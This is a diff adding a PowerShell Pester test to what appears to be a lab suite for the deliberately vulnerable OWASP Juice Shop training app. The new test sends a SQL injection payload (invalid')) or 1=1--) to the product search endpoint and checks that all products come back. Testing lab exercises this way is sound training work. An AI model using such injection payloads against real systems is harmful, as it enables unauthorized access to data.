@@ -683,5 +683,15 @@ Describe '507 Labs'{
       ($res.Content | ConvertFrom-Json).authentication.umail | 
         Should -BeExactly 'amy@juice-sh.op'
     }
+
+    It 'Part 3 - SQL Injection returns all data' {
+      # invalid')) or 1=1--
+      $uri = 'http://juiceshop.5x7.local/rest/products/search?q=invalid%27%29%29%20or%201%3D1--'
+      $res = Invoke-WebRequest -uri $uri
+
+      $res.StatusCode | Should -BeExactly 200
+      ($res.Content | ConvertFrom-Json).data.Count |
+        Should -BeExactly 44
+    }
   }
 }
